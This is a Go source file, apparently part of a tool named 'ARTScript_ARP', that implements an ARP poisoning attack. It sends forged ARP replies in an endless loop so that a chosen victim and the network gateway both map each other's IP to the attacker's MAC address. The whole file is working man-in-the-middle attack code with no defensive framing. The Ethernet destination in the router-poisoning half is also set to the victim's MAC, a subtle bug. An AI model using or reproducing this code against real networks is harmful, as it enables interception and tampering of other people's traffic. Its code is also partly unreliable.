package arpPosion

import (
	"ARTScript_ARP/globalChan"
	"fmt"
	"net"
	"os"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/withmandala/go-log"
)

func Start_posion(device, gateway, gateway_mac, local, local_mac string, target net.IP, target_mac net.HardwareAddr) {
	gt := (net.ParseIP(gateway))[12:]
	//tg := (net.ParseIP(target))[12:]
	lc := (net.ParseIP(local))[12:]
	//tgm, _ := net.ParseMAC(target_mac)
	gtm, _ := net.ParseMAC(gateway_mac)
	lcm, _ := net.ParseMAC(local_mac)
	ArpPoison(device, gtm, gt, lcm, lc, target_mac, target)
}

func ArpPoison(device string, routerMac net.HardwareAddr, routerIP net.IP, localMac net.HardwareAddr, localIP net.IP, victimMac net.HardwareAddr, victimIP net.IP) {
	logger := log.New(os.Stderr).WithColor()
	// Open NIC at layer 2
	handle, err := pcap.OpenLive(device, 1024, false, pcap.BlockForever)
	if err != nil {
		logger.Error(err)
		os.Exit(1)
	}
	defer handle.Close()

	// create an empty ethernet packet
	ethernetPacket := layers.Ethernet{}
	// create an empty ARP packet
	arpPacket := layers.ARP{}
	// pre populate Arp Packet Info
	arpPacket.AddrType = layers.LinkTypeEthernet
	arpPacket.HwAddressSize = 6
	arpPacket.ProtAddressSize = 4
	arpPacket.Operation = 2
	arpPacket.Protocol = 0x0800

	// continiously put arp responses on the wire to ensure a good posion.
	for {
		/******** posion arp from victim to local ********/

		//set the ethernet packets' source mac address
		ethernetPacket.SrcMAC = localMac

		//set the ethernet packets' destination mac address
		ethernetPacket.DstMAC = victimMac

		//set the ethernet packets' type as ARP
		ethernetPacket.EthernetType = layers.EthernetTypeARP

		// create a buffer
		buf := gopacket.NewSerializeBuffer()
		opts := gopacket.SerializeOptions{}

		// customize ARP Packet info

		arpPacket.SourceHwAddress = localMac
		arpPacket.SourceProtAddress = routerIP
		arpPacket.DstHwAddress = victimMac
		arpPacket.DstProtAddress = victimIP

		// set options for serializing (this probably isn't needed for an ARP packet)

		// serialize the data (serialize PREPENDS the data)
		err = arpPacket.SerializeTo(buf, opts)
		if err != nil {
			logger.Error(err)
			os.Exit(1)
		}

		err = ethernetPacket.SerializeTo(buf, opts)
		if err != nil {
			logger.Error(err)
			os.Exit(1)
		}

		// turn the packet into a byte array
		packetData := buf.Bytes()

		//remove padding and write to the wire
		handle.WritePacketData(packetData[:42])
		//Sleep so we don't flood with ARPS
		time.Sleep(50 * time.Millisecond)
		/******** end posion arp from victim to local ********/

		/******** posion arp from router to local ********/

		//set the ethernet packets' source mac address
		ethernetPacket.SrcMAC = localMac

		//set the ethernet packets' destination mac address
		ethernetPacket.DstMAC = victimMac

		//set the ethernet packets' type as ARP
		ethernetPacket.EthernetType = layers.EthernetTypeARP

		// customize ARP Packet info

		arpPacket.SourceHwAddress = localMac
		arpPacket.SourceProtAddress = victimIP
		arpPacket.DstHwAddress = routerMac
		arpPacket.DstProtAddress = routerIP

		// set options for serializing (this probably isn't needed for an ARP packet)

		// serialize the data (serialize PREPENDS the data)
		err = arpPacket.SerializeTo(buf, opts)
		if err != nil {
			logger.Error(err)
			os.Exit(1)
		}

		err = ethernetPacket.SerializeTo(buf, opts)
		if err != nil {
			logger.Error(err)
			os.Exit(1)
		}

		// turn the packet into a byte array
		packetData = buf.Bytes()

		//remove padding and write to the wire
		handle.WritePacketData(packetData[:42])
		/******** end posion arp from router to local ********/

		//Sleep so we don't flood with ARPS
		//logger.Infof("arp spoof %v : %v", victimIP, victimMac)
		SendToChannel(fmt.Sprintf("arp spoof %v : %v", victimIP, victimMac))
		time.Sleep(2 * time.Second)
	}
}

func SendToChannel(information string) {
	abChan := globalChan.GetABGlobalChanString()
	abChan <- information

}
